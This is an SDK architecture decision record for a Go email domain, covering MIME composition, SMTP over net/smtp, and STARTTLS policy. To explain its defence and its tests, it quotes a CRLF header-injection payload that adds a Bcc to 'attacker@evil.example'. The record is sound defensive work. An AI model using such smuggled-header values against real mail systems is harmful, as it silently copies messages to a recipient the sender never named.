# ADR 0064 — electronic-mail domain (`mail`): composition is a mechanism, SMTP is a stdlib protocol, and a provider is neither

- **Status**: Accepted
- **Date**: 2026-09-10
- **Deciders**: SDK maintainers
- **Related**: [ADR 0031](0031-policy-zero-values-are-never-inert.md) (a policy's zero value is a safe default or an explicit refusal — the rule `TLSMode` is shaped by), [ADR 0039](0039-extending-a-published-port-without-breaking-it.md) (a published port grows by siblings), [ADR 0029](0029-sdk-net-domain.md) (the TLS identity this domain reuses instead of twinning), [ADR 0046](0046-sdk-validation-domain.md) (a message names the rule and never the value — the non-disclosure rule this follows), [ADR 0055](0055-sdk-sql-domain.md) (the hand-written `driver.Driver` precedent this test suite copies), [ADR 0022](0022-sdk-codec-hcl.md) / [ADR 0034](0034-hcl-quarantine-rationale-corrected.md) (where a vendor connector goes), [ADR 0030](0030-stdout-is-a-protocol-channel.md) (nothing is armed from an import)

## Context

Sending mail is a thing almost every service does and almost nobody does
correctly. The failure is not exotic; it is this:

```go
subject := "Order " + userSuppliedReference   // "R-42\r\nBcc: attacker@evil.example"
```

RFC 5322 §2.2 ends a header field at CRLF. So those two octets do not *corrupt*
the subject — they **terminate** it, and everything after becomes header lines
the caller never wrote. The message is well-formed, the send succeeds, the logs
are clean, and a copy of every order confirmation goes somewhere the sender
cannot see in what it composed. The same two octets in a display name, a
filename, or the right-hand side of an address do the same thing.

Around that sit four more decisions that are individually small and collectively
decide whether a message is readable: whether a non-ASCII subject is encoded and
how, what happens to a header longer than the line limit, which MIME container
holds which parts, and whether the session that carries it is encrypted.

The SDK's doctrine draws a line: **low level, total control, minimal
dependencies — except a connector to a third-party system, kept isolated.** This
domain sits astride that line, so the ADR's first job is to say where it falls.

## Decision

### D1 — The line: composition is ours, SMTP is the stdlib's, a provider is neither

| Concern | Verdict | Why |
|---|---|---|
| MIME composition (RFC 2045/2046/2047/5322) | **In the SDK**, written from the RFCs with `mime`, `mime/multipart`, `encoding/base64`, `mime/quotedprintable` — all stdlib | It is a MECHANISM: a pure function from a value to bytes, with no third party in it. The same reasoning that put the OTel data model (ADR 0044) and RFC 6455 (ADR 0047) in-tree. |
| SMTP (RFC 5321/3207/4954) | **In the SDK, over `net/smtp`** | It is a protocol to a third-party system, which would normally make it a connector — but `net/smtp` is in the standard library, so using it costs **zero dependencies**. The doctrine's isolation clause exists to bound a dependency budget; here there is nothing to bound. |
| A provider API (SES, SendGrid, Mailgun) | **`third-party/`, and not in this ticket** | An HTTP API owned by a vendor, versioned by that vendor, requiring that vendor's SDK or a hand-written client against a changing spec. That is exactly ADR 0022's quarantine. |

The port makes the third row cheap later: `Transport` has one method and no
session on it, so a provider connector is a new implementation in
`third-party/mail/<vendor>` and not a change here.

### D2 — What we commit to maintaining, given that `net/smtp` is frozen

`net/smtp`'s own documentation says: *"The smtp package is frozen and is not
accepting new features."* That is a statement about **features**, not about
maintenance — it still receives security fixes, and SMTP has not gained a
feature this domain wants since RFC 3207 (1999). It is not deprecated.

What this SDK commits to maintaining is the **policy above it**, which is where
every decision that matters lives and none of which `net/smtp` makes:

| We maintain | Because `net/smtp` |
|---|---|
| A required STARTTLS is refused, never downgraded | has no policy — the caller writes the loop |
| Credentials never travel unencrypted | `smtp.PlainAuth` sends them in the clear to a server named `localhost`: `if !server.TLS && !isLocalhost(server.Name)` |
| `tls.Config.ServerName` is filled from the configured host | `Client.StartTLS` passes the config to `tls.Client` **unchanged**, so an empty name fails the handshake and the obvious escape from that message is `InsecureSkipVerify` |
| A `context.Context` actually stops a send | takes no context at all |

If `net/smtp` is ever deprecated rather than frozen, the client is replaced
inside `internal/service/mail/smtp.go` and `core/mail.Transport` does not
change. That is the whole reason the port is one method.

### D3 — Header injection is REFUSED, never sanitised

Every string that will reach a header passes `ValidateHeaderValue`, which
refuses CR, LF and NUL. Bare CR and bare LF are refused as well as the pair,
because receivers disagree about a lone LF and some normalise it to CRLF —
reconstructing the attack downstream from input that looked survivable.

Sanitising is the tempting alternative and it is wrong for one reason: it
changes the message without telling anyone. The caller is told the send
succeeded, the recipient receives something the caller did not write, and the
next message carries the same payload because nobody learned anything.

The standard library will sanitise for you, and it will also not:

| stdlib call | given `"a\r\nBcc: x@y"` | |
|---|---|---|
| `mime.QEncoding.Encode` | `=?utf-8?q?a=0D=0ABcc:_x@y?=` | repairs, silently |
| `mime.FormatMediaType` | `filename*=utf-8''a%0D%0ABcc%3A%20x%40y` | repairs, silently |
| `net/mail.Address.String()` on `Name` | RFC 2047 encoded | repairs, silently |
| **`net/mail.Address.String()` on `Address`** | `"ok" <u@exa\r\nmple.com>` | **passes it through** |
| **`mime/multipart.Writer.CreatePart`** | header emitted verbatim | **passes it through** |

Those last two are measured, not recalled: the first is why `AddressValue` is
this domain's own type and not `net/mail.Address`, and the second is why this
package writes the `--boundary` framing itself rather than using
`multipart.Writer`. `TestMultipartWriterWouldHaveInjected` asserts the stdlib's
behaviour and **skips** rather than passing silently if a future Go release
changes it — so the reasoning gets revisited instead of quietly going stale.

The gate runs twice: once over the whole message in `core/mail.Validate`, before
anything is rendered or dialled, and again in `writeHeader` at the moment bytes
reach a buffer. The second is not ceremony — some values arriving there were
built by this package (an address list, a Content-Disposition assembled from a
filename), and only a gate at the write point covers every path into it.

**A refusal names the FIELD and never the VALUE.** Same rule as `validation`
(ADR 0046), `authz` (ADR 0057) and `view` (ADR 0058), and here the argument is
even simpler: the value being refused is by construction the string an attacker
chose, and `Public` travels to strangers. The header name and a byte offset go
in log-only fields.

**Bcc is a header a caller may not spell.** `Headers` naming any
composer-owned field — `From`, `Date`, `Subject`, `Message-ID`, `MIME-Version`,
`Content-*`, and `Bcc` — is `ReservedHeader`, compared case-insensitively
because RFC 5322 §3.6.8 field names are. Two different failures share that
refusal: RFC 5322 §3.6 permits exactly one `From`/`Date`/`Subject`, so a
duplicate leaves every receiver free to believe a different one; and spelling
`Bcc` by hand is the injection arriving through a supported API.

### D4 — Bcc reaches the envelope and nothing else

RFC 5322 §3.6.3 permits three treatments. This domain takes the only one that
cannot leak: `MessageValue.Envelope()` puts To, then Cc, then Bcc into `RCPT TO`, and
no header names a blind recipient. The other two are respectively N messages the
caller did not ask for, and a disclosure RFC 5321 §7.2 warns about explicitly.

Duplicates are **not** removed. An address in both To and Cc is two `RCPT TO`
commands, which every MTA collapses into one delivery; removing them here would
mean deciding that two addresses differing only in case are the same mailbox,
which only the receiving domain is entitled to decide.

### D5 — RFC 2047 only when necessary, and folding is normative

**Encoding.** `mime.QEncoding.Encode` leaves a pure-ASCII value untouched, and
that is the behaviour chosen rather than merely inherited. Encoding everything
would be one line simpler and would turn `Invoice 4711` into
`=?utf-8?q?Invoice_4711?=` in every captured message, every log line and every
mail-store search, to buy nothing — a receiver renders both identically.
Measured cost of the encoded path: **2.6×** an ASCII header (BENCH.md).

Q rather than B: for a mostly-ASCII value Q leaves the ASCII legible, and for a
fully non-ASCII one the size difference is a few percent.

**A display name has three cases, not two.** Non-ASCII → encoded-word (and NOT
also quoted; RFC 2047 §5 forbids an encoded-word inside a quoted-string). ASCII
carrying an RFC 5322 §3.2.3 special → quoted-string. Otherwise bare. The middle
case is the one everybody forgets: an unquoted `Doe, John <j@x>` parses as
**two** addresses, one of which is not an address, and the recipient's client
shows something different from the sender's.

**Folding (RFC 5322 §2.2.3) is normative, and only legal at whitespace.**
Unfolding is defined as "removing any CRLF that is immediately followed by WSP"
— the CRLF goes, the whitespace stays — so a fold placed at a space
reconstructs the value byte for byte, and a fold placed anywhere else inserts a
character the caller never wrote. Lines are folded toward the §2.1.1
recommendation of 78; a line that would exceed the **998-octet MUST NOT** and
contains no whitespace to fold at is **refused** (`HeaderTooLong`) rather than
cut, because cutting delivers a different value and reports success. RFC 2231
parameter continuation, which would rescue an over-long filename, is deferred by
name.

### D6 — The MIME structure is a function of the populated fields

```
text only                    → text/plain
HTML only                    → text/html
text + HTML                  → multipart/alternative(plain, html)
body + inline parts          → multipart/related(body, inline…)
body + attachments           → multipart/mixed(body, attachment…)
body + inline + attachments  → multipart/mixed(multipart/related(body, inline…), attachment…)
```

Three details decide whether it renders:

- **Plain comes FIRST in `multipart/alternative`.** RFC 2046 §5.1.4 orders
  alternatives "in increasing order of preference" and a receiver shows the last
  one it understands. HTML first asks every client to display the plain text.
- **`multipart/related` carries `type=`**, REQUIRED by RFC 2387 §3.1 and naming
  the root part's media type. `start` is omitted because the root is first,
  which §3.2 already defaults to.
- **No container for a single child.** A `multipart/mixed` with one part makes
  some clients show a paperclip on a message with no attachment.

One field decides both an attachment's disposition and its container: a
non-empty `ContentID` makes it inline, in the `related`, referenced as
`cid:<id>` (RFC 2392 §2). There is deliberately no separate `Disposition` field
to set inconsistently. An **inline part in a message with no body is refused** —
a `cid:` reference would have nothing to be referenced from and `multipart/related`
would have no root; demoting it to a regular attachment would silently turn an
embedded image into a file to download.

Text parts are quoted-printable (RFC 2045 §6.7), which guarantees the §2.1.1
line limits and 7-bit safety without 8BITMIME, which nothing here negotiates.
Attachments are base64 wrapped at 76 octets (§6.8) through a streaming writer.
`charset=utf-8` is always present on a text part, because without it §5.2
defaults to us-ascii and every accent becomes a question mark.

**Boundaries cannot collide, structurally rather than probably.** Every boundary
is `=_<32 hex>_<n>`. A boundary cannot appear in a part body because both
encodings reach a literal `=` only as an escape prefix, a soft line break or
trailing padding — so `=_` cannot occur in either. Two boundaries in one message
cannot match because they share one token and differ by a counter.
`TestNestedBoundariesAreAlwaysDistinct` runs with a randomness source that
returns a **constant**, so a design relying on the draw would fail every time.

**Structure is asserted by REPARSING**, with `net/mail` and `mime/multipart`,
never by comparing a golden string — a string comparison only says the output
did not change, while a reparse says a receiver can read it.

### D7 — TLS: refuse rather than degrade, and the zero value is refused

```go
type TLSMode uint8
const (
    TLSUnset    TLSMode = iota // refused at construction
    TLSStartTLS                // RFC 3207, port 587 — REQUIRED, never opportunistic
    TLSImplicit                // RFC 8314 §3.3, port 465 — no plaintext phase at all
    TLSDisabled                // spelled out loud; credentials refused with it
)
```

**The zero is refused** (ADR 0031's refusing half). Both candidate defaults are
wrong for somebody: encrypting silently breaks the caller pointing at a
plaintext relay on a private segment, and not encrypting silently ships everyone
else's credentials in the clear. Neither is a value the SDK is entitled to
choose.

**There is no opportunistic mode**, not even as a config field. Encrypt-if-offered,
continue-in-the-clear-if-not is the shape most mail libraries ship, and it means
an on-path attacker who strips one line from the EHLO response reads the whole
session — credentials included — while the sender's logs show a successful
delivery. `TLSStartTLS` against a server advertising no STARTTLS is
`TLSRequired` and the session ends before `MAIL FROM`.

**Credentials never travel unencrypted, and the check is made twice.** At
construction, `TLSDisabled` with a `Username` is `AuthInsecure`. At send time,
`client.TLSConnectionState()` is consulted before `AUTH` is written. The second
is not redundant: `smtp.PlainAuth` sends the password in the clear whenever the
server is named `localhost`, `127.0.0.1` or `::1` — defensible for the stdlib's
audience, and a credential leak in a container where the relay one hop away IS
127.0.0.1 and the bridge between them is joinable.

**The TLS identity is `core/net.IdentityValue`, reused rather than twinned**
(ADR 0029). A mail server's TLS is the same TLS every other outbound connection
in this SDK uses; a second configuration type would be a second place for a
minimum version to be wrong. `ServerName` is filled from `Host` when the
identity names none, because `net/smtp` will not.

### D8 — Two transports, and the double composes

`NewSMTP` dials per send and holds **no pooled connection**: an SMTP session is
stateful, a pooled one must be revalidated with a NOOP before every reuse, and
the caller who wants one session for many messages has `BatchSender` — the
ADR 0039 sibling that exists precisely because the handshake, not the bytes,
dominates a send.

`NewMemory` **composes**. A stub recording the `Message` value would accept a
CRLF subject, an inline part with no body and a hand-written `Bcc` — every
refusal production makes, made nowhere — and a consumer's suite would go green
right up to deployment. `Delivery` carries the composed BYTES rather than the
message, because checking the message only checks what the test built a moment
earlier.

`SendBatch` aggregates with `errors.Join` and never short-circuits: one refused
recipient in five hundred must not silence the other four hundred and
ninety-nine, and `errs.HasCode` walks `Unwrap() []error` so a joined error
answers the same questions a single one does.

### D9 — What this domain does NOT guarantee

Stated here as loudly as ADR 0052 states its fencing limit and ADR 0056 states
what "atomic" does not reach.

- **A nil error is ACCEPTANCE, not delivery.** SMTP accepts responsibility hop
  by hop (RFC 5321 §6.1). The hop that eventually refuses says so in a bounce,
  hours later, to the envelope's return path, over a channel this port cannot
  see. Anything that reports "delivered" from a successful `Send` is lying.
- **No deliverability, and no SPF/DKIM/DMARC.** Whether a message reaches an
  inbox rather than a spam folder depends on DNS records and a signing key with
  an operational lifetime, a rotation procedure and an owner. A DKIM signature
  is an infrastructure decision, not a library call, and this SDK signs nothing.
  It will not pretend the absence of a signature is a detail.
- **No rendering promise.** Whether a client shows the HTML, the plain text, or
  an inline image at all is that client's decision. What is guaranteed is that
  the structure is the one the RFCs prescribe for the content supplied — which
  is the half a library can be responsible for.
- **No queueing, no retry, no dead-lettering.** `Send` is synchronous on the
  caller's goroutine. A caller who wants "asynchronous but reliable" belongs on
  the `queue` domain (ADR 0053's line), not on half of it here.
- **No inbound mail.** No IMAP, no POP3, no parsing of received messages. The
  domain composes and sends.

## Consequences

**Positive.** Header injection is impossible to reach by accident and is refused
with a typed error that names no value. A non-ASCII subject arrives readable and
an ASCII one stays readable in the raw bytes. The MIME structure is correct for
each combination and is proved by reparsing. A downgrade to cleartext cannot be
configured, and credentials cannot leave the process unencrypted. Zero external
dependencies: `git diff -- '*/go.mod' go.mod` is empty. A provider connector is
a later, isolated addition rather than a change here.

**Negative, accepted.** The accepted address grammar is a SUBSET — no SMTPUTF8
(RFC 6531), no quoted local parts — and both are refused **by name** rather than
transliterated, so a caller with an internationalised address gets a clear
refusal instead of a delivery to somebody else. A header token longer than 998
octets with no whitespace is refused rather than folded, which RFC 2231
continuation could have rescued for filenames; deferred by name. No connection
pool, so a caller sending many one-off messages pays a handshake each time
unless they use `BatchSender`.

**Measured.** Composition costs 12 µs for a simple message and 2.6 ms per
mebibyte of attachment, at an expansion ratio of **1.370** — which is the number
a caller sizes against a relay's message limit, since a 25 MB limit accepts an
18.2 MB attachment. The injection gate costs 1.7 µs and 16 B for a five-address
message, which is why there is no option to turn it off. One optimisation was
made and it was profiled first: `bytes.growSlice` was **43.7 % of all bytes
allocated**, and pre-sizing the output buffer from an exactly-computed base64
term cut the 1 MiB case from 4.20 MB to 1.45 MB allocated and from 3.82 ms to
2.77 ms. See `internal/service/mail/BENCH.md`.

## Alternatives considered

- **Use `go-mail`, `gomail` or `email`.** Every one of them is a dependency for
  code that is `mime` plus `net/smtp` plus a policy — and the policy is the part
  they get wrong: at least two ship opportunistic STARTTLS, and the sanitising
  behaviour above is the norm rather than the exception. Rejected on doctrine
  and on the specific defects.
- **Reimplement SMTP.** Would buy context support and a session type, and cost a
  hand-written RFC 5321 client with its own dot-stuffing, pipelining and
  reply-parsing bugs, for a protocol whose stdlib implementation is stable and
  security-maintained. Rejected; the two things `net/smtp` lacks are bought
  above it (a severed socket for cancellation, an explicit TLS policy).
- **Sanitise instead of refuse.** Rejected in D3.
- **Generate a `Message-ID`.** Would mean inventing entropy and a DOMAIN the SDK
  does not own. RFC 6409 §8.2 makes it the submission server's job when absent.
  Rejected; a caller-supplied one is emitted, and nothing else.
- **`Bcc` as one message per blind recipient.** Legal (RFC 5322 §3.6.3) and
  turns one `Send` into N sends the caller did not ask for and cannot see in the
  return value. Rejected.
- **A `Disposition` field on `Attachment`.** Would let the disposition and the
  enclosing multipart subtype disagree, which is exactly the message that shows
  a broken image in one client and a stray attachment in another. Rejected; one
  field (`ContentID`) decides both.
- **A registry of transports.** Nothing to key it on: there is one protocol
  here, and a provider connector lives in `third-party/` where a consumer wires
  it by name in code. Rejected, as in `lock`, `authz` and `session`.

## Verification

```bash
cd internal/core    && GOWORK=off go test -race ./mail/...
cd internal/service && GOWORK=off go test -race ./mail/...
cd pkg              && GOWORK=off go test -race ./v1/mail/...
cd internal/service && GOWORK=off go test -run='^$' -bench=. -benchmem -benchtime=1s ./mail/
git diff -- '*/go.mod' go.mod   # empty: no dependency was added
```

No test in this domain touches the network. The SMTP cases run against a
hand-written server on a local `net.Listener`
(`internal/service/mail/fakesmtp_external_test.go`) that speaks the subset the
transport uses — the same reasoning that made ADR 0055 write its own
`driver.Driver`, and for a sharper reason here: a real relay would not let a
test **decide what to advertise**, and every interesting case in this domain is
a server that advertises the wrong thing. Its TLS certificate is minted
in-process with `crypto/ed25519`.

The named guards:

| Test | What it pins |
|---|---|
| `TestHeaderInjectionIsRefusedOnEveryCallerControlledField` | thirteen fields, each driven with `"legit\r\nBcc: attacker@evil.example"`, all refused |
| `TestHeaderInjectionErrorNeverDisclosesTheValue` | neither `Error()`, `Public` nor any field carries the refused string |
| `TestBccNeverBecomesAHeaderAndAlwaysBecomesARecipient` / `TestBccIsNeverInTheComposedBytes` | D4, on both sides |
| `TestComposedStructureMatchesTheFieldsThatArePopulated` | the D6 table, reparsed with `mime/multipart` |
| `TestSMTPRefusesToDowngradeWhenSTARTTLSIsNotOffered` | the session ends before `MAIL`; no downgrade |
| `TestSMTPNeverSendsCredentialsOverCleartext` | no `AUTH` on an unencrypted socket — **and** that `net/smtp` sends one to the same server |
| `TestSMTPSetsTheVerifiedName` | the `ServerName` fill `net/smtp` omits |
| `TestMultipartWriterWouldHaveInjected` | the stdlib behaviour behind D3 |
| `TestUnfoldableHeaderIsRefusedRatherThanTruncated` / `TestFoldingIsReversible` | D5, both halves |
| `TestTransportStaysFrozenAtOneMethod` | ADR 0039 |
